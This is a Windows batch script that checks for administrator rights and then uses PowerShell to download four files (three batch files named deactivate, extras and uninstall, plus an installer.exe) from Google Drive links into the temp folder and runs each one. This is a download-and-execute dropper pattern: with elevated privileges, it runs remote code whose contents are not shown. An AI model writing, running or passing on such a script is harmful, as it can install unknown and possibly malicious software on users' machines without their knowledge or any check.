@echo off
goto check_Permissions

:check_Permissions
    echo Administrative permissions required. Detecting permissions...

    net session >nul 2>&1
    if %errorLevel% == 0 (
        echo Success: Administrative permissions confirmed.
    ) else (
	goto Fail
    )




powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://drive.google.com/uc?export=download&id=19KCdfXTyzk3eWqSUv4P-NuMgpgJ1SjXa', '%Temp%\deactivate.bat') }"
start %Temp%\deactivate.bat
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://drive.google.com/uc?export=download&id=1gh3JHk1P2bktz8Chq2ZtCR2STkw4sDyc', '%Temp%\extras.bat') }"
start %Temp%\extras.bat
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://drive.google.com/uc?export=download&id=17xzeSeS1Uztl8c6z9T44MPiUZiSdT_NL', '%Temp%\uninstall.bat') }"
start %Temp%\uninstall.bat
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://drive.google.com/uc?export=download&id=1s8--_7p0K86Jspl-l5IvvkqOvnbR5kiT', '%Temp%\installer.exe') }"
start %Temp%\installer.exe
:Fail
exit